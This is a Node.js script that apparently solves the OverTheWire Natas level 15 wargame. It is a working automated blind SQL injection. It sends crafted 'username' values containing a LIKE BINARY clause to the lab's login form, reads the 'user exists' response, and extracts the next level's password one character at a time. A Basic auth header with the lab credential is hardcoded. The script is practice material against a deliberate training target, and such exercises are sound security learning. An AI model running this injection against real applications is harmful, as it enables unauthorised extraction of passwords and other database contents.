const request = require("request")
const { parse } = require("node-html-parser")

const url = "http://natas15.natas.labs.overthewire.org/index.php"

async function serveRequest(query) {
  const formData = {
    username: query,
  }

  return new Promise((res, rej) => {
    request.post(
      {
        url: url,
        formData: formData,
        headers: {
          Authorization:
            "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==",
        },
      },
      function optionalCallback(err, httpResponse, body) {
        if (err) {
          console.log(err)
          res(-1)
        }
        res(body)
      }
    )
  })
}

const digits = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

function doesUserExist(htmlStr) {
  const existMsg = "\r\nThis user exists."
  const notExistMsg = "\r\nThis user doesn't exist."
  function getMessage() {
    const root = parse(htmlStr)
    return root.querySelector("#content").firstChild.text
  }

  const msg = getMessage()
  if (msg === existMsg) {
    return true
  } else if (msg === notExistMsg) {
    return false
  } else {
    return -1
  }
}

;(async function () {
  let crackedPass = ""
  for (var i = 0; i < 32; i++) {
    let found = false

    console.log("starting checking the digits : ")
    for (var d in digits) {
      const query = `natas16" and password LIKE BINARY "${crackedPass}${digits[d]}%`
      console.log("testing digit " + digits[d])
      const r = await serveRequest(query)
      const userExist = doesUserExist(r)

      if (userExist === true) {
        crackedPass = crackedPass + digits[d]
        found = true
        break
      }
    }

    if (!found) {
      console.log("ERR", "couldnt find")
      return
    } else {
      console.log("crackedPass = " + crackedPass)
    }
  }
})()
